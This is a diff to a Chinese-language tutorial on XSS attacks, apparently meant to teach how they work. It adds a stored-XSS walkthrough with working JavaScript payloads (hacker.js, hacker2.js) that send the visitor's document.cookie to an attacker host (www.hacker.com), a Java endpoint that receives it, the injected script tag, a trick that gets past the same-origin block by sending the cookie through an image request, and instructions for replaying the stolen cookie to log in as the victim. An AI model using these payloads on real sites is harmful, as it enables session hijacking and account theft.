@@ -270,15 +270,79 @@ XSS分为
 
 3. 窃取cookie
 
+   通过上面的原理我们可以编写下面的脚本hacker.js
+
+   ```javascript
+   function creatrXmlHttpRequest(){
+       if(window.ActiveXObject){
+           return new ActiveXObject("Microsoft XMLHTTP");
+       }else if(window.XMLHttpRequest){
+           return new XMLHttpRequest();
+       }
+   }
    
+   function send(){
+       xmlHttpRequest =  creatrXmlHttpRequest();
+       xmlHttpRequest.open("get","http://www.hacker.com/getCookie?param=url:"+window.location.href+"&cookie:"+document.cookie,true);
+       xmlHttpRequest.send();
+   }
+   send();
+   ```
+
+   然后将这个脚本放到黑客服务器上，然后在黑客服务器提供对应的接口（比如部署一个）：
+
+   ```java
+   @GetMapping("/getCookie")
+   public void getCookie(@RequestParam("param") String param){
+       System.out.println(param);
+   }
+   ```
+
+   我们打开浏览器在输入框输入我们的攻击代码如下，按确认按钮提交我们的代码
+
+   ~~~
+   <script src="http://www.hacker.com/hacker.js"> </script>
+   ~~~
+
+   这时我们会看到浏览器会禁止我们脚本中的请求，因为浏览器有同源策略。
+
+   ![image-20220301143549665](https://mypic-12138.oss-cn-beijing.aliyuncs.com/blog/picgo/image-20220301143549665.png)
 
 4. 绕过浏览器同源策略
 
-   
+   那么我们可以利用html的特性去绕过浏览器的同源机制，我们新建hacker2.js,然后放在黑客服务器上
+
+   ~~~javascript
+   (function (){
+       (new Image()).src = "http://www.hacker.com/getCookie?param="+
+           escape("url:"+document.location.href)+
+           escape("&cookie:"+document.cookie);
+   })();
+   ~~~
+
+   打开浏览器在输入框输入我们的攻击代码如下，按确认按钮提交我们的代码
+
+   ~~~
+   <script src="http://www.hacker.com/hacker2.js"> </script>
+   ~~~
+
+   我们查看请求发现请求已经发送成功，而且cookie在后台也已经获取到了
+
+   ![image-20220301151153613](https://mypic-12138.oss-cn-beijing.aliyuncs.com/blog/picgo/image-20220301151153613.png)
 
 5. 通过cookie入侵
 
+   上一步已经获取到了cookie，所以我们在登录时，直接替换cookie的值如下图，之后刷新就可以直接登录了，到这就已经完成了攻击。
    
+   ![image-20220301151325387](https://mypic-12138.oss-cn-beijing.aliyuncs.com/blog/picgo/image-20220301151325387.png)
+
+**反射型XSS攻击**
+
+反射型XSS，又称非持久型XSS，恶意diamagnetic并没有保存在目标网站，而是通过引诱用户点击一个恶意链接来实施攻击，这类攻击的特征有：恶意脚本在url中，只有点击链接才会引起攻击；不具备持久型，一般发生在与用户交互的地方。
+
+反射型XSS演示
+
+**DOM型XSS攻击**
 
 
 
